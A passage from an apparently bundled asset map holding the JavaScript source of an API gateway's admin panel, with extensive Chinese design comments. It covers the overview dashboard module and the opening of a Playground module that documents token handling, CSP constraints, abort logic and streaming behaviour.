实测）：两条链并存时，一条晚到的失败会走到这里，\n    //    而此刻 `catalog` 里可能正握着一份刚读成功的目录 ⇒ 下面这一行把它抹掉。\n    // ⚠️⚠️ **这一行的安全性架在**三**条守卫上，不是一条**（复评 F2 实测订正：\n    //    上一版写的是「依赖那一行」，而它把下一个人指向了两条里的一条）：\n    //    ① `load()` 开头那条 `inFlight` 早退（隐式入口不再发第二条）；\n    //    ② `onShow()` 里的 `if (catalog !== null) { render(); return; }`\n    //       ——**留着 ① 不动、只删 ②，表照样被抹**（`rows 4→0, unknown 0→1, calls 1→2`）；\n    //    ③ 上下这两处 `if (mine !== seq) return;`（被抢占的那条不许生效）。\n    //    **改动这三处里的任何一处之前，先回来读这一段。**\n    if (mine !== seq) return;\n    catalog = null;\n  } finally {\n    // 被抢占的那条不许替**新**的那条把在飞标记清掉。\n    if (mine === seq) { inFlight = false; abort = null; }\n  }\n  render();\n}\n\nexport const modelsSection = {\n  init(section) {\n    section.textContent = \"\";\n    section.appendChild(elI18n(\"h2\", \"models.title\"));\n    section.appendChild(elI18n(\"p\", \"models.desc\", { class: \"muted note\" }));\n    const body = el(\"div\");\n    section.appendChild(body);\n    nodes = { body };\n  },\n\n  onShow() {\n    // 成功读过一次就直接重画（切语言时框架层会重跑 onShow，那时也走这一支）。\n    if (catalog !== null) { render(); return; }\n    load();\n  },\n};\n", type: "text/javascript; charset=utf-8", etag: "\"cf3962350b2981f0\"" },
  "/admin/js/sec-overview.js": { body: "/**\n * 概览板块（设计文档 §10.1，本期形状见 P3b 计划 Task 5 Step 7）：\n * 4 张池子卡 → 运行时信息面板 → 新鲜度卡 → 累计用量卡 → 配置摘要 → 存储卡。\n *\n * 板块契约（设计文档 §9.3）：`{ init?, onShow?, onHide? }`，见 admin-ui/js/app.js\n * 的 showSection。**板块内不许监听 langchange**——框架层会 apply(document) 之后\n * 重跑一次 onShow()。\n *\n * 两条纪律：①一切来自接口的内容一律 textContent；②**取值决策一律不写在这里**，\n * 全在 `js/pure/overview.mjs` 里由 `tests/ui/overview.test.ts` 跑着（admin-ui/README.md\n * 硬规则 1）。这个文件只剩 DOM 拼装、事件绑定与网络调用。\n *\n * **一切形态分支只读接口返回的数据**（`process === null` / `storage.backend` /\n * `runtime.name` 这些来自响应体的字段），不许自己嗅探运行时（硬约束 1）。\n */\nimport { api } from \"./api.js\";\nimport { t } from \"./i18n.js\";\nimport { el, elI18n } from \"./ui.js\";\nimport { fmtCount, fmtDash, fmtDuration, fmtInstant, fmtPercent, fmtBytesMb } from \"./pure/format.mjs\";\nimport {\n  POOL_CARDS, poolCardLabelKey, runtimeNameLabelKey, storageBackendLabelKey,\n  poolCounts, processCells, usageStats, configSummary, storageInfo,\n  freshnessValues, kvReadEstimatePerIsolatePerDay, offsetMs,\n} from \"./pure/overview.mjs\";\n\nlet nodes = null;\nlet abort = null;\n/**\n * 最近一次成功的 `/overview` 响应；`null` 表示「还没有过一次成功」——\n * 唯一状态源，不另设 `loadError` 标记：本板块所有渲染函数只按 `data === null`\n * 分支（不像 Key 池板块要区分「空列表」与「读失败」两种不同文案），\n * 两份状态各写各的只会漂移。\n */\nlet data = null;\n/**\n * `/capabilities` 只拉一次（静态数据：版本号、colo、quota model 这些在一个\n * isolate/进程的生命周期里不会变），不跟着每次刷新重新拉——它的**零存储读**特性\n * 值得在前端也体现成「零额外网络往返」，而不是每次点刷新都再打一次。\n */\nlet caps = null;\n\n/** 建一张 `.card`（4 张池子卡 / 运行时信息面板复用同一个原语）。 */\nfunction tile(labelKey) {\n  const card = el(\"div\", { class: \"card\" });\n  card.appendChild(elI18n(\"div\", labelKey, { class: \"label\" }));\n  const value = el(\"div\", { class: \"value\" });\n  card.appendChild(value);\n  return { card, value };\n}\n\n/** 建一个内容块：标题 + 空的 body 容器，供各卡片各自往里塞段落。 */\nfunction block(titleKey) {\n  const wrap = el(\"div\", { class: \"card block\" });\n  wrap.appendChild(elI18n(\"h3\", titleKey));\n  const body = el(\"div\");\n  wrap.appendChild(body);\n  return { wrap, body };\n}\n\n/** 「标签: 值」一行。`labelKey` 走 i18n，值由调用方之后自己 textContent。 */\nfunction row(labelKey) {\n  const p = el(\"p\");\n  p.appendChild(el(\"span\", { class: \"muted\" }, `${t(labelKey)}: `));\n  const value = el(\"span\");\n  p.appendChild(value);\n  return { p, value };\n}\n\nfunction renderPoolCards() {\n  const c = poolCounts(data);\n  for (const card of POOL_CARDS) nodes.pool[card].textContent = fmtCount(c[card]);\n}\n\n/**\n * 运行时信息面板的 8 格。**判据一律来自 `processCells()` 的 `kind`**\n * （产品不变式 11：不是 0、不是空、不隐藏格子）。`colo` 只在 `/capabilities`\n * 加载成功后才有；没拿到时格子仍在，显示 `—`。\n */\nfunction renderRuntimeTiles() {\n  const n = nodes.runtime;\n  n.version.textContent = data && typeof data.version === \"string\" ? data.version : fmtDash(null);\n\n  const runtimeName = data && data.runtime && typeof data.runtime.name === \"string\" ? data.runtime.name : null;\n  if (runtimeName === null) {\n    n.runtimeLabel.textContent = fmtDash(null);\n  } else {\n    const runtimeLabel = t(runtimeNameLabelKey(runtimeName));\n    const colo = caps && caps.runtime && typeof caps.runtime.colo === \"string\" ? caps.runtime.colo : null;\n    n.runtimeLabel.textContent = colo === null ? runtimeLabel : `${runtimeLabel} (${colo})`;\n  }\n\n  n.serverTime.textContent = data && typeof data.serverTime === \"number\"\n    ? fmtInstant(data.serverTime, offsetMs()) : fmtDash(null);\n\n  const si = storageInfo(data);\n  n.storageBackend.textContent = si.backend === null ? fmtDash(null) : t(storageBackendLabelKey(si.backend));\n\n  const p = processCells(data);\n  const serverless = t(\"ov.runtime.serverless\");\n  n.memory.textContent = p.kind === \"serverless\" ? serverless : fmtBytesMb(p.kind === \"metrics\" ? p.rssBytes : null);\n  n.uptime.textContent = p.kind === \"serverless\" ? serverless : fmtDuration(p.kind === \"metrics\" ? p.uptimeMs : null);\n  n.pid.textContent = p.kind === \"serverless\" ? serverless : fmtCount(p.kind === \"metrics\" ? p.pid : null);\n\n  n.writable.textContent = si.writable === null\n    ? fmtDash(null)\n    : t(si.writable ? \"ov.runtime.writableYes\" : \"ov.runtime.writableNo\")\n      + (si.checkedAt === null ? \"\" : ` (${t(\"ov.runtime.checkedAt\", { at: fmtInstant(si.checkedAt, offsetMs()) })})`);\n}\n\nfunction renderFreshness() {\n  const f = freshnessValues(data);\n  nodes.freshness.pool.textContent = f.poolCacheTtlMs === null\n    ? fmtDash(null)\n    : t(\"ov.freshness.pool\", {\n      upper: fmtDuration(f.poolVisibilityUpperBoundMs),\n      ttl: fmtDuration(f.poolCacheTtlMs),\n      edge: fmtDuration(f.kvEdgeCacheMs),\n    });\n  nodes.freshness.config.textContent = f.configTtlMs === null\n    ? fmtDash(null)\n    : t(\"ov.freshness.config\", {\n      upper: fmtDuration(f.configVisibilityUpperBoundMs),\n      ttl: fmtDuration(f.configTtlMs),\n      edge: fmtDuration(f.kvEdgeCacheMs),\n    });\n}\n\n/** `≈` 标记。它是产品不变式的一部分（近似值必须打标），由后端的 `approximate` 驱动。 */\nfunction approxMark() {\n  return el(\"span\", { class: \"approx\", title: t(\"ov.usage.approxTip\") }, \"≈ \");\n}\n\nfunction renderUsage() {\n  const u = usageStats(data);\n  const fillTile = (node, text) => {\n    node.textContent = \"\";\n    if (u.approx) node.appendChild(approxMark());\n    node.appendChild(el(\"span\", null, text));\n  };\n  fillTile(nodes.usage.requests, fmtCount(u.requests));\n  fillTile(nodes.usage.success, fmtCount(u.success));\n  fillTile(nodes.usage.failed, fmtCount(u.failed));\n  fillTile(nodes.usage.clientErrors, fmtCount(u.clientErrors));\n  fillTile(nodes.usage.successRate, fmtPercent(u.success, u.requests));\n}\n\nfunction renderConfig() {\n  const c = configSummary(data);\n  // **`c === null` = 整块读失败，逐格显示 —**；`c` 存在时 `primary`/`fallback`\n  // 仍可能合法为 null（注册机未启用），那种情形显示「无」而不是 ———两种 null\n  // 的来源不同，见 configSummary 的说明，调用方必须先判这一层再往下取字段。\n  nodes.config.banner.style.display = c !== null && c.degraded === true ? \"\" : \"none\";\n  nodes.config.registrar.textContent = c === null || c.registrarEnabled === null\n    ? fmtDash(null) : t(c.registrarEnabled ? \"ov.config.on\" : \"ov.config.off\");\n  nodes.config.primary.textContent = c === null ? fmtDash(null) : (c.primary === null ? t(\"ov.config.none\") : c.primary);\n  nodes.config.fallback.textContent = c === null ? fmtDash(null) : (c.fallback === null ? t(\"ov.config.none\") : c.fallback);\n  nodes.config.targetKeys.textContent = c === null ? fmtDash(null) : fmtCount(c.targetKeys);\n  if (c === null) {\n    // ⚠️ **降级态也要带标签。** 这一行不再走 `row()` 之后（见 buildConfigCard），\n    // 直接写 `fmtDash(null)` 会让整段读失败时前四行是「注册机：—」「主通道：—」…、\n    // 第五行变成孤零零一个 `—`：修掉一个 `{count}` 泄漏，换来一处标签丢失。\n    // 整句仍由这一个节点承载，只是把 `{count}` 换成破折号。\n    nodes.config.envLocked.textContent = t(\"ov.config.envLocked\", { count: fmtDash(null) });\n    nodes.config.envLocked.removeAttribute(\"title\");\n  } else {\n    nodes.config.envLocked.textContent = t(\"ov.config.envLocked\", { count: fmtCount(c.envLocked.length) });\n    nodes.config.envLocked.title = c.envLocked.length === 0\n      ? \"\" : t(\"ov.config.envLockedTip\", { fields: c.envLocked.join(\", \") });\n  }\n}\n\nfunction renderStorageCard() {\n  const si = storageInfo(data);\n  nodes.storageCard.backend.textContent = si.backend === null\n    ? fmtDash(null) : t(storageBackendLabelKey(si.backend));\n  nodes.storageCard.writable.textContent = si.writable === null\n    ? fmtDash(null) : t(si.writable ? \"ov.runtime.writableYes\" : \"ov.runtime.writableNo\");\n\n  if (si.backend === null) {\n    nodes.storageCard.note.textContent = fmtDash(null);\n  } else if (si.backend === \"kv\") {\n    const estimate = kvReadEstimatePerIsolatePerDay(data);\n    nodes.storageCard.note.textContent = estimate === null\n      ? t(\"ov.storageCard.workerNoteUnknown\")\n      : t(\"ov.storageCard.workerNote\", { estimate: fmtCount(estimate) });\n  } else {\n    nodes.storageCard.note.textContent = t(\"ov.storageCard.nodeNote\");\n  }\n}\n\nfunction render() {\n  // **只读，不改状态**：`data` 由 `load()` 的 try/catch 单独维护，\n  // `render()` 从两条路进来（`load()` 与 `loadCapabilities()` 之后的重渲），\n  // 把「读失败 ⇒ data 置空」这种状态修改留在这里会让 render() 变成一个\n  // 「谁调用它、状态就跟着变」的函数，两条调用路径互相踩脚。所有子渲染函数\n  // 都要能安全处理 data === null（逐块降级来自后端，这里再叠一层\n  // 「整段响应都没读到」的兜底）。\n  renderPoolCards();\n  renderRuntimeTiles();\n  renderFreshness();\n  renderUsage();\n  renderConfig();\n  renderStorageCard();\n}\n\nasync function loadCapabilities() {\n  if (caps !== null) return;\n  try {\n    caps = await api.get(\"/capabilities\");\n  } catch (e) {\n    // 拿不到就是拿不到，colo 那一格保持 —；不重试到下一次 onShow。\n  }\n}\n\nasync function load() {\n  if (abort) abort.abort();\n  abort = new AbortController();\n  try {\n    const body = await api.get(\"/overview\", { signal: abort.signal });\n    data = body;\n  } catch (e) {\n    if (e && e.name === \"AbortError\") return;\n    // **不伪造上一次的数据**：读失败就把 data 清空，不留着旧值以为它是新的。\n    data = null;\n  }\n  render();\n}\n\nfunction buildPoolCards(section) {\n  const cardRow = el(\"div\", { class: \"card-row\" });\n  const values = {};\n  for (const card of POOL_CARDS) {\n    const { card: node, value } = tile(poolCardLabelKey(card));\n    values[card] = value;\n    cardRow.appendChild(node);\n  }\n  section.appendChild(cardRow);\n  return values;\n}\n\nfunction buildRuntimeTiles(section) {\n  section.appendChild(elI18n(\"h3\", \"ov.runtime.title\"));\n  const row1 = el(\"div\", { class: \"card-row\" });\n  const row2 = el(\"div\", { class: \"card-row\" });\n  const specs = [\n    [\"ov.runtime.version\", row1], [\"ov.runtime.runtimeLabel\", row1],\n    [\"ov.runtime.serverTime\", row1], [\"ov.runtime.storageBackend\", row1],\n    [\"ov.runtime.memory\", row2], [\"ov.runtime.uptime\", row2],\n    [\"ov.runtime.pid\", row2], [\"ov.runtime.writable\", row2],\n  ];\n  const values = {};\n  const keyOf = {\n    \"ov.runtime.version\": \"version\", \"ov.runtime.runtimeLabel\": \"runtimeLabel\",\n    \"ov.runtime.serverTime\": \"serverTime\", \"ov.runtime.storageBackend\": \"storageBackend\",\n    \"ov.runtime.memory\": \"memory\", \"ov.runtime.uptime\": \"uptime\",\n    \"ov.runtime.pid\": \"pid\", \"ov.runtime.writable\": \"writable\",\n  };\n  for (const [labelKey, host] of specs) {\n    const { card, value } = tile(labelKey);\n    values[keyOf[labelKey]] = value;\n    host.appendChild(card);\n  }\n  section.appendChild(row1);\n  section.appendChild(row2);\n  return values;\n}\n\nfunction buildFreshnessCard(section) {\n  const { wrap, body } = block(\"ov.freshness.title\");\n  const pool = el(\"p\");\n  const config = el(\"p\");\n  body.appendChild(pool);\n  body.appendChild(config);\n  section.appendChild(wrap);\n  return { pool, config };\n}\n\nfunction buildUsageCard(section) {\n  const { wrap, body } = block(\"ov.usage.title\");\n  const cardRow = el(\"div\", { class: \"card-row\" });\n  const specs = [\n    [\"ov.usage.requests\", \"requests\"], [\"ov.usage.success\", \"success\"],\n    [\"ov.usage.failed\", \"failed\"], [\"ov.usage.clientErrors\", \"clientErrors\"],\n    [\"ov.usage.successRate\", \"successRate\"],\n  ];\n  const values = {};\n  for (const [labelKey, k] of specs) {\n    const { card, value } = tile(labelKey);\n    values[k] = value;\n    cardRow.appendChild(card);\n  }\n  body.appendChild(cardRow);\n  body.appendChild(elI18n(\"p\", \"ov.usage.tip\", { class: \"muted note\" }));\n  section.appendChild(wrap);\n  return values;\n}\n\nfunction buildConfigCard(section) {\n  const banner = elI18n(\"div\", \"ov.config.degradedBanner\", { class: \"banner-danger\" });\n  banner.style.display = \"none\";\n  section.appendChild(banner);\n\n  const { wrap, body } = block(\"ov.config.title\");\n  const registrar = row(\"ov.config.registrar\");\n  const primary = row(\"ov.config.primary\");\n  const fallback = row(\"ov.config.fallback\");\n  const targetKeys = row(\"ov.config.targetKeys\");\n  // ⚠️ **`ov.config.envLocked` 不是标签，是一句自带 `{count}` 的完整句子**\n  //（「被环境变量锁定的字段数：{count}」）。用 `row()` 渲染它，标签那半会调\n  // `t(key)` 且**不带参数** ⇒ 面板上出现裸的 `{count}`，紧接着值那半又把整句\n  // 重复一遍。Task 7 的阶段验收人工冒烟在 Node 形态上实测到了这个形态：\n  //   「被环境变量锁定的字段数：{count}: 被环境变量锁定的字段数：1」\n  // 所以它单独占一行，整句由 renderConfigCard 一次性写进这个 <p>。\n  // 这一类回归现在由 `scripts/check-i18n.mjs` 的第 ⑧ 条挡着（带占位符的 key\n  // 不许被当成不带参数的裸标签用）。\n  const envLocked = el(\"p\");\n  for (const r of [registrar, primary, fallback, targetKeys]) body.appendChild(r.p);\n  body.appendChild(envLocked);\n  section.appendChild(wrap);\n  return {\n    banner,\n    registrar: registrar.value, primary: primary.value, fallback: fallback.value,\n    targetKeys: targetKeys.value, envLocked,\n  };\n}\n\nfunction buildStorageCard(section) {\n  const { wrap, body } = block(\"ov.storageCard.title\");\n  const backend = row(\"ov.storageCard.backend\");\n  const writable = row(\"ov.storageCard.writable\");\n  body.appendChild(backend.p);\n  body.appendChild(writable.p);\n  const note = el(\"p\", { class: \"muted note\" });\n  body.appendChild(note);\n  section.appendChild(wrap);\n  return { backend: backend.value, writable: writable.value, note };\n}\n\nexport const overviewSection = {\n  init(section) {\n    section.textContent = \"\";\n    section.appendChild(elI18n(\"h2\", \"ov.title\"));\n    const refresh = elI18n(\"button\", \"common.refresh\", { type: \"button\" });\n    refresh.addEventListener(\"click\", () => { load(); });\n    section.appendChild(refresh);\n\n    const pool = buildPoolCards(section);\n    const runtime = buildRuntimeTiles(section);\n    const freshness = buildFreshnessCard(section);\n    const usage = buildUsageCard(section);\n    const config = buildConfigCard(section);\n    const storageCard = buildStorageCard(section);\n\n    nodes = { pool, runtime, freshness, usage, config, storageCard };\n  },\n\n  onShow() {\n    loadCapabilities().then(() => render());\n    load();\n  },\n\n  onHide() {\n    if (abort) { abort.abort(); abort = null; }\n  },\n};\n", type: "text/javascript; charset=utf-8", etag: "\"246f7c9f8901dd41\"" },
  "/admin/js/sec-playground.js": { body: "/**\n * Playground 板块（设计 §10.5）：左栏配请求、右栏看对话。\n *\n * 板块契约（设计文档 §9.3）：`{ init?, onShow?, onHide? }`，见 admin-ui/js/app.js\n * 的 showSection。**板块内不许监听 langchange**——框架层会 apply(document) 之后\n * 重跑一次 onShow()。\n *\n * ── **本板块是「消费协议目录」这条路径的第三个前端消费者** ────────────────────\n * P3d 核心设计决定（全局约束 15）：四个消费者只许有一份「怎么调这个网关」的知识。\n * ⇒ **本文件的可执行代码里没有任何一条对外端点路径、没有任何一个协议 id、\n *    也没有任何一份请求体形状**（两条 admin 路径 `api.get(\"/models\")` 与\n *    `api.get(\"/config\")` 为什么不算，见下面「两条 admin 路径为什么不算第二份端点知识」）。\n * 协议档位与展示名来自响应的 `protocols[]`，模型下拉来自 `models[]`，\n * URL 与请求体由 `js/pure/playground.mjs` 拿那份响应现拼。\n *\n * ── **这是面板上第二颗「按一下就真打上游」的按钮**（全局约束 14）────────────────\n * 第一颗是 Key 池的验活（P3d Task 9）。护栏在同一个任务里一起交付：\n * · **在飞去重**：同一时刻只许一次在飞，按钮 disabled，旁边出现「取消」。\n *   ⚠️ **判据只有一份，就是 `sendBlockedKey()` 的第一档**（`pg.send.blockedInFlight`）：\n *   按钮的 `disabled` 与 `sendOnce()` 的早退**读的都是它**。\n *   ⚠️⚠️ 这一版曾经在 `sendOnce()` 开头另写过一句 `if (inFlight) return;`，\n *   **变异实测删掉它 22/22 全绿**——那是一句没有任何用例守着的冗余，\n *   而当时这一段正声称它是护栏本体。**已删，这段话已改真。**\n * · **取消令牌**：`AbortController`，点取消 / 切走板块都作废这一次。\n *\n * ⚠️⚠️ **刻意不加最小间隔闸，这条差别必须写下来**：Key 池的验活有一道 3 秒闸\n * （`js/pure/keys-write.mjs` 的 `VERIFY_MIN_INTERVAL_MS`，后端 `probe-guard.ts` 还有\n * 对称的一道）。**Playground 不加**——它是**交互式调试工具**，运维改一句提示词连发\n * 几次是正常用法，而每一次都是他自己坐在那儿等结果（有在飞去重兜着，同一时刻最多\n * 一条在飞）。照抄那道闸只会得到一个让人恼火的 3 秒禁用态。\n * **下一个人别照着 `probe-guard` 把它补上。**\n *\n * ⚠️ **「重新发送时 abort 上一次」今天没有触发路径，如实写明**：在飞去重 + 按钮\n * disabled 之后，一次在飞期间根本发不出第二条。所以作废只有**两个**入口\n * （取消按钮、`onHide()`）。写一条今天走不到的抢占分支等于摆一段死代码，\n * 而本仓在 `js/sec-models.js` 的文件头上记过「一句『今天用不上它』的话会被后来的\n * 改动推翻」——所以这里记的是相反的方向：**哪天允许在飞时再发，抢占分支要连同它的\n * 世代号一起补上**，别只把 disabled 去掉。\n *\n * ⚠️⚠️ **abort 那一半在测试里天然不可观测，写清楚**：`tests/ui/dom/harness.ts` 的\n * `fetch` 替身**零处**看 `signal` ⇒ 被 abort 的那条链在测试里照样会落地。\n * **别把那几格绿了读成「abort 被钉住了」**——它们钉的是下面那个「这一次还是不是当前\n * 那一次」的判据（`current !== ctl`），与 `js/sec-keys.js` 的验活、`js/sec-models.js`\n * 的世代号是同一条判据。真实浏览器里 abort 让那条链以 `AbortError` 拒绝，\n * 同一条判据同样把它挡在外面。\n *\n * ── **网关口令：面板永远只是它的搬运工**（全局约束 11(b)）─────────────────────\n * 口令由用户手动粘贴、存在浏览器里（`js/pure/storage-keys.mjs` 的 `GW_KEY_STORE`），\n * **后端不开任何回显口子**。本文件因此有一条硬纪律：\n * **口令的值只许出现在两个地方——那个 `<input>` 的 `.value`，和 `js/gw-api.js`\n * 拼请求头的那一行。** 不许进 `title`、不许进 `data-*`、不许进任何一句错误文案的插值、\n * 更不许进右栏的任何一格。由 `tests/ui/dom/playground-section.test.ts` 的\n * 「面板上任何一处都不出现网关口令 —— 输入框的值不许漏进标题、属性或任何一句错误文案」\n * 那一格逐个属性扫着钉住。\n * ⚠️ 口令输入框旁边那句「与设置页那把对不对得上」只画**档位名**，判定在\n * `js/pure/playground.mjs` 的 `tokenHintState()`，它按定义不返回口令的任何一个字节。\n *\n * ── 媒体两档（P3d Task 12 接上）：只展示地址，**不内嵌远端任何东西** ────────────\n * ⚠️⚠️ **面板样式与 `src/ui/serve.ts` 的 CSP 一个字都没放宽**（全局约束 17）：\n * 那条 CSP 是 img-src 只放行本源与 data 两档、**且完全没有 media-src**\n * （⇒ video 元素落回 default-src none）。⇒ 媒体那两档**只展示地址 + 复制按钮 +\n * 在新标签页打开**；唯一被内嵌的是 data 开头且 MIME 为图片的那一种（CSP 本来就放行它）。\n * ⚠️ **不许为了内嵌去放宽 CSP**：那条 CSP 是 `ADMIN_TOKEN` 存在这个 origin 的浏览器\n * 本地存储里的唯一结构性防线（作用域是 origin 不是 path，\n * 论证全文在 `src/core/dispatcher.ts` 的 `DOCUMENT_MIME` 那段长注释）。\n * ⚠️ **「能不能内嵌」「能不能做链接」两条判据都是纯函数，不在本文件里目测**\n * （`js/pure/playground.mjs` 的 `mediaEmbeddable()` / `mediaLinkable()`）。\n * 由 `tests/ui/playground-media.test.ts` 的\n * 「远端 http(s) 地址一律不可内嵌 —— 面板 CSP 的 img-src 里没有任何远端主机（订正 F6）」\n * 与 `tests/ui/dom/playground-section.test.ts` 的\n * 「媒体结果只出现地址与链接，一个内嵌远端资源的元素都没有」两格钉着。\n * ⚠️ **链接元素必须显式带 `rel=\"noopener noreferrer\"`**：`target=\"_blank\"` 的 a 元素\n * 现代浏览器会隐式补 `noopener`，**但那是浏览器的默认值、不是这段代码的性质**，\n * 而 `window.open()` 从来不补。由 `tests/ui/dom/playground-section.test.ts` 的\n * 「结果链接带 rel 的 noopener noreferrer 两条」钉着。\n *\n * ── 视频是两段式，而轮询的三条护栏一条都不许省（设计 §10.5）─────────────────\n * ① **有上限**：判定在 `js/pure/playground.mjs` 的 `videoPollNext()`，次数与时长两条\n *    同时判。**一个忘了关的标签页就是一台永动打点机**，每一次打点都是一次真的上游请求；\n * ② **页面藏起来时暂停**（照抄事件板块 `js/sec-events.js` 的 `scheduleNext()` 做法），\n *    变回可见时接回去；\n * ③ **`onHide()` 停轮询**（板块契约，设计 §9.3）——与取消按钮走同一个 `cancelInFlight()`。\n * ⚠️ **轮询期间在飞标记不松开**（全局约束 14）：松开的话运维能同时点起第二条视频任务，\n * 而两条任务的打点会叠在一起烧配额。代价是那几分钟里发送按钮是灰的，\n * **取消按钮一直在**，随时可以停。\n *\n * ⚠️⚠️ **一次视频任务最多 1 + 60 次上游请求，这条没有进 DEPLOY.md 的配额账，\n * 登记在这里**（全局约束 13 的触发条件是「新增一个会写存储的代码路径」，\n * 而本任务一条都没新增——它只是让**已有**的那条路径被按得更频）。\n * · **上游请求数与 key 的使用次数**：实打实按 61 倍算，这是真实成本；\n * · **存储写次数**：**不按 61 倍放大**——`lastUsedAt` 与用量计数由\n *   `src/core/keypool-repo.ts` 的 `touchIntervalMs`（默认 6 小时）那道写消除闸管着，\n *   一轮轮询打不满一次落盘。冷却 / 剔除那两笔仍按失败次数算。\n * ⇒ 会打穿的是**上游那边的配额**，不是 KV 的日写配额。别把这两件事混着读。\n *\n * ── 流式（P3d Task 11）：开关已经接上，而且两种运行时都是真的逐块 ─────────────\n * Task 10 时这个开关是 `disabled` 的（读流那一半还没写）。**现在它是真的。**\n * ⚠️ **「真的逐块」这句话是真机量出来的，不是推出来的**：假上游 1 秒/块 × 4 块，\n * `curl -N` 逐块打时间戳，**Node（`@hono/node-server`）与 Worker（`wrangler dev`\n * 起的真 workerd）两侧的到达间隔都是约 1 秒**，不是四块一起到 ⇒ 两种形态都逐块透传。\n * ⇒ **本板块因此没有任何形态分支**：流式在哪种部署上都能用，不需要降级、\n * 也不需要往 `capabilities` 里加一格「这个形态能不能流」。\n * ⚠️ **哪天这条前提变了，改的是后端那一格 + 这里读它，不是在这里嗅探运行时**\n * （全局约束 1：一切形态分支只许读 `GET /admin/api/capabilities`）。\n *\n * ⚠️⚠️ **而「哪天变了」这件事今天没有任何机器会告诉你（登记 P3e）。**\n * 那条前提现在是一个**已发货功能的承重墙**，可它**没有回归网**：\n * `tests/contract/stream-parity.test.ts` 的\n * 「上游第二块还没 enqueue 时客户端已经读到了第一块 —— 被整体缓冲的话 Playground 的流式开关就是假话」\n * 走的是进程内的 `app.request()`，它自己的文件头就写着**证明不了 workerd 的 HTTP 服务层**。\n * ⇒ **workerd 哪天改成缓冲，一格测试都不会红，而这个面板会静默变成一句假话**\n *（开关照按、正文照出，只是一次性全到）。堵它要一次「起 wrangler dev + curl -N\n * 量到达间隔」的真机冒烟，那不是单元测试能装下的东西。\n *\n * ── 右栏：流式画正文，非流式仍画响应原文 ────────────────────────────────────\n * **流式没有「原文」可展示**——它天然要一块一块把正文取出来拼。「这条协议的正文在\n * 哪一格」因此顶到了台面上，而答案是**往协议目录加一格**（`streamTextPath`，\n * 真源 `src/core/admin/protocol-catalog.ts`），**不是在这里写第四份对照表**\n * （全局约束 15）。本文件因此仍然不认识任何一个协议 id。\n * ⚠️ **非流式那一档没有跟着改**：`streamTextPath` 只覆盖流式增量，\n * 「非流式响应里那句话在哪」是另一格，**今天没有第二个消费者要它**\n * ⇒ 登记 P3e，理由全文在 `js/pure/playground.mjs` 的 `prettyJson()` 上方。\n *\n * ── 流式那一轮为什么不显示 token 用量 ───────────────────────────────────────\n * **因为网关的流式响应里根本没有真的 token 数**，而其中一条**还带着一个恒为 0 的字段**：\n * `src/core/protocol/anthropic.ts` 的 `message_delta` 事件写死 `usage: {output_tokens: 0}`。\n * ⇒ 谁顺手把「响应里的 usage」画出来，Anthropic 那条流就会在面板上显示 **0 个 token**\n * ——那是全局约束 9 明令禁止的那件事（**伪造 0 比显示「没有」更糟**）。\n * ⇒ 流式那一轮**今天一个字节的 usage 都不读**，只画一句「流式响应不带 token 用量」。\n * 由 `tests/ui/dom/playground-section.test.ts` 的\n * 「流式那一轮不显示任何 token 数字 —— Anthropic 的流里带着一个恒为 0 的 usage」钉着。\n *\n * ⚠️⚠️ **别把上面那句读成「结构上不可能」——它只是「今天没写」。**（评审 F2 实测）\n * 我原来在报告里写过「结构性地不读，不是靠自觉」，**那是言过其实**：\n * 评审在 `onPayload` 里加三行解析 `usage.output_tokens`、在下面多画一行\n * `` `Tokens: ${…}` `` ⇒ **当时 103/103 全绿**，屏幕上同时出现\n *「流式响应不带 token 用量…」与「Tokens: 0」。\n * 当时守着它的只有一条**按字段名**的子串断言（换个标签就绕过）与一条**计数**断言\n *（只挡替换、不挡新增）。\n * ⇒ 现在守它的是**闭集**断言：那一格逐条比对这一轮渲染出来的「标签 + class」列表，\n * **多画任何一行都红**。这仍然是一道测试，不是一条结构性的不可能。\n *\n * ── 两条 admin 路径为什么不算「第二份端点知识」 ──────────────────────────────\n * 全局约束 15 管的是「怎么调**这个网关**」那张对外面（对外路径、请求体形状、鉴权头），\n * 不是「怎么够得着那份真源」。`js/sec-models.js` 与 `js/sec-usage.js` 已经写着同样的\n * `api.get(\"/models\")`，本文件与它们同一条边界。\n * ⚠️ **但要写清代价：这两条 admin 路径今天没有任何机器在守**\n * （`tests/ui/no-hardcoded-endpoints.test.ts` 的\n * 「前端没有任何文件硬编码网关端点路径 —— 端点只许来自 /admin/api/models」\n * 那一格的正则只认对外那棵树的路径）。\n *\n * ── 三条纪律（与其余七个板块相同）────────────────────────────────────────────\n * ① 一切来自接口的内容一律 textContent（`el()` 走的就是它）：右栏画的是**上游原样\n *    回来的响应体**，那是全站最该守这条的一处；\n * ② **取值决策一律不写在这里**，全在 `js/pure/playground.mjs` 里（admin-ui/README.md 硬规则 1）；\n * ③ **一切形态分支只读接口返回的字段**，不许自己嗅探运行时（全局约束 1）。\n *\n * ⚠️ **双运行时：非流式长请求在两种形态下可能表现不同，面板不许承诺它们一样**（U-B）。\n * 已核实的官方口径：HTTP 触发的 Worker **没有**墙钟上限、单条子请求也**没有**时间上限\n * （只要客户端还连着）；而 `wrangler.toml` 里那个 15 分钟是 `scheduled()` 的数，\n * **不是 `fetch()` 的**。官方文档**没有**说 CDN 那条 125 秒回源读超时（524）适不适用于\n * Worker 自己发出的子请求 ⇒ 按「没有平台承诺」处理。五语言 DEPLOY.md 里那一段写的是\n * 同一件事，本板块的文案因此只说「这一次等了多久」，不说「多久之内一定不会被砍断」。\n */\nimport { api } from \"./api.js\";\nimport { t } from \"./i18n.js\";\nimport { el, elI18n, copy } from \"./ui.js\";\nimport { readGatewayToken, writeGatewayToken, sendToGateway, streamFromGateway } from \"./gw-api.js\";\nimport { catalogModels } from \"./pure/models.mjs\";\nimport { credentialView } from \"./pure/settings.mjs\";\nimport { fmtDash } from \"./pure/format.mjs\";\nimport {\n  playgroundProtocols, modelIdsForProtocol, buildRequest, tokenHintState, prettyJson, deltaText,\n  mediaEndpoints, modelIdsForModality, mediaEmbeddable, mediaLinkable, mediaResultUrls,\n  videoTaskIdOf, buildPollRequest, videoPollNext, VIDEO_POLL_MAX_ATTEMPTS,\n} from \"./pure/playground.mjs\";\n\n/**\n * 三个模式档位。**写成一张本地表，因为它们是这个板块自己的 UI 状态，不是协议知识**\n * ——`chat` 走 `protocols[]`、另两档走 `media[]` 里 `modality` 与它相等的那些条目。\n * ⚠️ **`image` / `video` 这两个字符串同时是真源里 `modality` 的取值**，本文件因此\n * 与真源共享这两个词。它不归全局约束 15 管（那条管的是端点路径 / 请求体形状 / 协议名），\n * 